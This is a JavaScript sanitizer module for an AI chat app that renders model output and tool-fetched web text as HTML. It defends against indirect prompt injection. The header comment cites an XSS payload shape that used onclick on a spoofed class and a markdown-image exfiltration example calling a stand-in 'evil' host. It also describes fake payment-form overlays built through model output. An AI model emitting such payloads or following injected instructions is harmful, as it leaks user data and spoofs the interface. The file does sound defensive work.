/**
 * ============================================================
 * PHRAORTES SECURITY LAYER — security.js  (v2)
 * ============================================================
 * Everything the model writes — and everything it reads through tools
 * like read_url / web_search — is UNTRUSTED text (indirect prompt
 * injection). renderMD() is the only path from that text to the DOM.
 *
 * WHAT CHANGED IN v2 (and why)
 * ------------------------------
 * v1 re-allowed `onclick` whenever an element carried class="code-tool-btn".
 * But the CLASS is attacker-controlled too, so
 *     <a class="code-tool-btn" onclick="...">
 * in model output survived sanitizing. That was a real XSS hole.
 *
 * v2 removes inline handlers from the sanitizer entirely:
 *   1. marked.parse() -> HTML.
 *   2. Phraortes' own trusted widgets (code cards with Run/Copy/Canvas
 *      buttons, charts, QR cards...) are NOT put in that HTML. The
 *      renderer swaps them for an inert <div data-phr-slot="TOKEN-n">,
 *      where TOKEN is random per render call, so model text can't forge it.
 *   3. DOMPurify sanitizes the HTML with NO onclick allowed anywhere.
 *   4. Only AFTER sanitizing are the slots replaced by the trusted HTML.
 * Untrusted markup never carries a handler; trusted markup never touches
 * the sanitizer. Any SVG that a trusted widget embeds is cleaned
 * separately with PHR_cleanSVG().
 *
 * ALSO HARDENED
 *   - style attributes are filtered to a safe allow-list (no position:fixed
 *     "fake payment screen" overlays), <style> tags are removed
 *   - remote <img> from model text is click-to-load (blocks silent
 *     data-exfiltration via ![](https://evil/?q=...) )
 *   - links open in a new tab with rel=noopener noreferrer
 *   - each text block gets dir="auto" so mixed Persian/English messages
 *     lay out per paragraph
 *
 * LOAD ORDER — after DOMPurify and marked (see <head> in phraortes.html).
 * ============================================================
 */

(function () {
  "use strict";

  var esc = function (s) {
    return String(s).replace(/[&<>"']/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
    });
  };
  window.PHR_esc = esc;

  // ---- fail closed if a dependency is missing -----------------------------
  if (typeof DOMPurify === "undefined" || typeof marked === "undefined") {
    console.error("[Phraortes Security] DOMPurify/marked missing — rendering as escaped plain text.");
    window.PHR_trusted = function (h) { return h; };
    window.PHR_cleanSVG = function () { return ""; };
    window.renderMD = function (raw) {
      return '<div style="white-space:pre-wrap">' + esc(raw || "") + "</div>";
    };
    return;
  }

  // ---- style allow-list ---------------------------------------------------
  var SAFE_STYLE = /^(color|background|background-color|fill|fill-opacity|stroke|stroke-width|stroke-linecap|stroke-linejoin|stroke-dasharray|stroke-opacity|stop-color|stop-opacity|opacity|font-family|font-size|font-weight|font-style|text-align|text-anchor|dominant-baseline|direction|text-decoration|letter-spacing|line-height|width|height|max-width|border|border-radius|padding|margin|display)$/;
  function cleanStyle(v) {
    return String(v).split(";").map(function (d) { return d.trim(); }).filter(function (d) {
      if (!d) return false;
      var i = d.indexOf(":");
      if (i < 1) return false;
      var prop = d.slice(0, i).trim().toLowerCase(), val = d.slice(i + 1).toLowerCase();
      if (!SAFE_STYLE.test(prop)) return false;
      if (/url\s*\(|expression|javascript:|@import|var\s*\(/.test(val)) return false;
      return true;
    }).join(";");
  }

  var BLOCK_DIR = /^(P|UL|OL|H[1-6]|BLOCKQUOTE|TD|TH)$/;

  // ---- one hook set, shared by every sanitize() call ------------------------
  DOMPurify.addHook("afterSanitizeAttributes", function (node) {
    if (!node || node.nodeType !== 1) return;
    if (node.hasAttribute && node.hasAttribute("style")) {
      var c = cleanStyle(node.getAttribute("style"));
      if (c) node.setAttribute("style", c); else node.removeAttribute("style");
    }
    if (node.nodeName === "A" && node.hasAttribute("href")) {
      node.setAttribute("target", "_blank");
      node.setAttribute("rel", "noopener noreferrer nofollow");
    }
    if (node.nodeName === "INPUT") {
      // The only legitimate <input> a markdown render ever produces is GFM's disabled task-list checkbox
      // ("- [ ] task"). Anything else — text fields, a fake "wallet address" input, a submit button dressed
      // up as an input — gets removed outright rather than merely defanged.
      var isSafeCheckbox = node.getAttribute("type") === "checkbox" && node.hasAttribute("disabled");
      if (!isSafeCheckbox) { node.parentNode && node.parentNode.removeChild(node); return; }
      // even the safe shape gets stripped to exactly that shape — no stray attributes riding along.
      Array.prototype.slice.call(node.attributes).forEach(function (a) { if (a.name !== "type" && a.name !== "disabled" && a.name !== "checked") node.removeAttribute(a.name); });
    }
    if (node.nodeName === "IMG") {
      var src = node.getAttribute("src") || "";
      if (/^https?:\/\//i.test(src)) {
        // Never auto-load a remote image chosen by untrusted text.
        var host = "";
        try { host = new URL(src).hostname; } catch (e) {}
        node.setAttribute("data-phr-src", src);
        node.removeAttribute("src");
        node.removeAttribute("srcset");
        node.setAttribute("class", "phr-img-gate");
        node.setAttribute("alt", "🖼 Tap to load image" + (host ? " — " + host : ""));
      }
    }
    // dir="auto" resolves from the first strong character of the element's OWN text and skips descendants that
    // carry their own dir — so a <p> inside an <li>/<blockquote> must not get one, or the parent falls back to LTR
    // (bullets/quote bars on the wrong side of a Persian paragraph). <li> itself never gets one: its <ul>/<ol> decides.
    if (BLOCK_DIR.test(node.nodeName)) {
      var pn = node.parentNode && node.parentNode.nodeName;
      if (!(node.nodeName === "P" && (pn === "LI" || pn === "BLOCKQUOTE"))) node.setAttribute("dir", "auto");
    }
  });

  var CFG = {
    // input/button/textarea/select/option/label/fieldset: the model has no legitimate reason to emit
    // interactive form controls — those only exist to build a convincing fake UI (e.g. a spoofed payment
    // form) inside a chat bubble.
    FORBID_TAGS: ["style", "form", "meta", "link", "base", "iframe", "object", "embed", "button", "textarea", "select", "option", "label", "fieldset"],
    // id/class: stripped from untrusted content entirely. A crafted id="pay-address" or class="toast" could
    // otherwise collide with real app elements/styles and spoof part of the UI. Trusted widgets never need
    // DOMPurify to keep these — they inject their real markup, classes included, through PHR_trusted() below,
    // which bypasses the sanitizer completely.
    FORBID_ATTR: ["srcdoc", "formaction", "onclick", "onerror", "onload", "id", "class"],
    ALLOW_DATA_ATTR: false
  };


  // ======================================================================
  // MATH (LaTeX) — $..$  $$..$$  \(..\)  \[..\]
  // The math is cut out BEFORE markdown (so _ * ^ inside formulas survive) and put back AFTER sanitizing
  // as KaTeX output (trust:false => no \href / \includegraphics / \html* tricks). Code spans and fences are never touched.
  // No regex look-behind anywhere: it is a SyntaxError on iOS < 16.4 and would kill the whole file.
  // ======================================================================
  function scanMath(text) {
    var out = [], i = 0, n = text.length, buf = "";
    function flush() { if (buf) { out.push({ t: "text", v: buf }); buf = ""; } }
    while (i < n) {
      var c = text.charAt(i), d = text.charAt(i + 1);
      if (c === "\\") {
        if (d === "(" || d === "[") {
          var close = d === "(" ? "\\)" : "\\]", j = text.indexOf(close, i + 2);
          if (j > 0 && text.slice(i + 2, j).trim()) { flush(); out.push({ t: "math", v: text.slice(i + 2, j), d: d === "[" }); i = j + 2; continue; }
        }
        buf += c + d; i += 2; continue; // escaped char (\$ stays literal text for markdown)
      }
      if (c === "$") {
        if (d === "$") {
          var j2 = text.indexOf("$$", i + 2);
          if (j2 > 0 && text.slice(i + 2, j2).trim()) { flush(); out.push({ t: "math", v: text.slice(i + 2, j2), d: true }); i = j2 + 2; continue; }
        } else if (i + 1 < n && !/\s/.test(d)) {
          // inline: closing $ must follow a non-space and must not be followed by a digit ("costs $5 and $10" is not math)
          var k = i + 1, found = -1;
          while (k < n) {
            var ck = text.charAt(k);
            if (ck === "\\") { k += 2; continue; }
            if (ck === "\n" && text.charAt(k + 1) === "\n") break;
            if (ck === "$") { // inline math never contains a bare $: it is either the closer or this was not math at all ("$5 and $10, or $x$")
              if (!/\s/.test(text.charAt(k - 1)) && !/[0-9]/.test(text.charAt(k + 1))) found = k;
              break;
            }
            k++;
          }
          if (found > i + 1) { flush(); out.push({ t: "math", v: text.slice(i + 1, found), d: false }); i = found + 1; continue; }
        }
      }
      buf += c; i++;
    }
    flush();
    return out;
  }
  window.PHR_scanMath = scanMath;

  function splitCode(raw) {
    var segs = [], re = /```[\s\S]*?```|~~~[\s\S]*?~~~|`[^`\n]+`/g, last = 0, m;
    while ((m = re.exec(raw))) {
      if (m.index > last) segs.push([0, raw.slice(last, m.index)]);
      segs.push([1, m[0]]); last = m.index + m[0].length;
    }
    var rest = raw.slice(last), f = rest.search(/```|~~~/); // unclosed fence (still streaming): the rest is code
    if (f >= 0) { if (f > 0) segs.push([0, rest.slice(0, f)]); segs.push([1, rest.slice(f)]); }
    else if (rest) segs.push([0, rest]);
    return segs;
  }

  function protectMath(raw, store, token) {
    return splitCode(raw).map(function (seg) {
      if (seg[0]) return seg[1];
      return scanMath(seg[1]).map(function (p) {
        if (p.t === "text") return p.v;
        store.push(p);
        return "PHRMATH" + token + "X" + (store.length - 1) + "Z";
      }).join("");
    }).join("");
  }

  function texHTML(tex, display) {
    tex = String(tex).trim();
    if (!tex) return "";
    if (window.katex) {
      try {
        return window.katex.renderToString(tex, { displayMode: !!display, throwOnError: false, trust: false, strict: "ignore", maxSize: 20, maxExpand: 1000, output: "htmlAndMathml" });
      } catch (e) { /* fall through to plain text */ }
    }
    // KaTeX not loaded (yet): show the source, upgraded automatically when the library arrives
    return '<span class="phr-tex" data-d="' + (display ? 1 : 0) + '" data-t="' + encodeURIComponent(tex) + '">' + esc(tex) + "</span>";
  }
  window.PHR_texHTML = texHTML;

  window.PHR_inline = function (text) { // escaped text + inline math + **bold** + `code` — for trusted widgets
    var out = "";
    scanMath(String(text == null ? "" : text)).forEach(function (p) {
      if (p.t === "math") out += texHTML(p.v, p.d);
      else out += esc(p.v).replace(/\*\*([^*]+)\*\*/g, "<b>$1</b>").replace(/`([^`]+)`/g, "<code>$1</code>");
    });
    return out;
  };

  function upgradeMath(root) {
    if (!window.katex) return;
    (root || document).querySelectorAll(".phr-tex:not([data-done])").forEach(function (el) {
      el.setAttribute("data-done", "1");
      try { el.outerHTML = texHTML(decodeURIComponent(el.getAttribute("data-t") || ""), el.getAttribute("data-d") === "1"); } catch (e) {}
    });
  }
  window.PHR_upgradeMath = upgradeMath;
  (function waitForKatex() {
    var tries = 0, iv = setInterval(function () {
      tries++;
      if (window.katex) { clearInterval(iv); upgradeMath(document); return; }
      if (tries === 8 && !document.getElementById("katex-fallback-js")) { // primary CDN slow/blocked: try the second one
        var b = "https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.11/";
        var l = document.createElement("link"); l.rel = "stylesheet"; l.href = b + "katex.min.css"; document.head.appendChild(l);
        var sc = document.createElement("script"); sc.id = "katex-fallback-js"; sc.src = b + "katex.min.js"; document.head.appendChild(sc);
      }
      if (tries > 80) clearInterval(iv);
    }, 500);
  })();

  // ---- trusted-slot machinery -----------------------------------------------
  var ctx = null;
  function rnd() {
    var a = new Uint32Array(3);
    (window.crypto || window.msCrypto).getRandomValues(a);
    return Array.prototype.map.call(a, function (n) { return n.toString(36); }).join("");
  }

  /** Called by trusted renderers. Returns an inert slot; real HTML is put back after sanitizing. */
  window.PHR_trusted = function (html) {
    if (!ctx) return html;
    ctx.items.push(html);
    return "\uE000PHRSLOT" + ctx.token + "X" + (ctx.items.length - 1) + "Z\uE001";
  };

  /** Clean an SVG string (used by trusted widgets that embed model-written SVG). */
  window.PHR_cleanSVG = function (svg) {
    try {
      return DOMPurify.sanitize(String(svg), {
        USE_PROFILES: { svg: true, svgFilters: true },
        FORBID_TAGS: ["style", "foreignObject"],
        FORBID_ATTR: ["onclick", "onerror", "onload"]
      });
    } catch (e) { return ""; }
  };

  /**
   * The ONLY function phraortes.html may use to turn markdown into HTML.
   * Never call marked.parse() anywhere else.
   */
  window.renderMD = function (raw) {
    var prev = ctx;
    var mine = { token: rnd(), items: [] };
    ctx = mine;
    try {
      var mstore = [], mtoken = rnd().replace(/[^a-z0-9]/gi, "");
      var src = protectMath(String(raw || ""), mstore, mtoken);
      var dirty = marked.parse(src);
      var clean = DOMPurify.sanitize(dirty, CFG);
      var re = new RegExp("\uE000PHRSLOT" + mine.token + "X(\\d+)Z\uE001", "g");
      clean = clean.replace(re, function (m, i) { return mine.items[+i] || ""; });
      if (mstore.length) {
        clean = clean.replace(new RegExp("PHRMATH" + mtoken + "X(\\d+)Z", "g"), function (m, i) {
          var p = mstore[+i]; return p ? texHTML(p.v, p.d) : "";
        });
      }
      // horizontal-scroll wrapper for wide tables (sanitized HTML has balanced tags, so plain replacement is safe)
      return clean.replace(/<table\b/g, '<div class="table-scroll"><table').replace(/<\/table>/g, "</table></div>");
    } catch (e) {
      console.error("[Phraortes Security] renderMD failed:", e);
      return "<div style='color:#ff453a;font-size:13px'>⚠ Content could not be rendered safely.</div>";
    } finally {
      ctx = prev;
    }
  };

  // Tap-to-load for gated remote images (event delegation, no inline handlers).
  document.addEventListener("click", function (e) {
    var img = e.target && e.target.closest && e.target.closest("img.phr-img-gate");
    if (!img) return;
    var src = img.getAttribute("data-phr-src");
    if (src && /^https?:\/\//i.test(src)) {
      img.removeAttribute("data-phr-src");
      img.classList.remove("phr-img-gate");
      img.setAttribute("alt", "");
      img.setAttribute("src", src);
    }
  });

  console.log("[Phraortes Security] v2 + math active — renderMD() is ready.");
})();
